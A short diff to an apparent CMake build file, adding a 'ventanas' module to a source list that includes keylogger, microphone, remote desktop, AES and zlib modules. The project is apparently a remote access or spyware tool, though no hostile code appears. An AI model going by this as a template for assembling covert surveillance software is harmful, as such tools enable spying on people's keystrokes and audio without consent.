@@ -20,6 +20,7 @@ set(SRCS main.cpp
          mod_keylogger.cpp
          mod_mic.cpp
          mod_remote_desktop.cpp
+         mod_ventanas.cpp
          ../aes256/aes256.cpp
          ../zlib/compress.c 
          ../zlib/inflate.c 
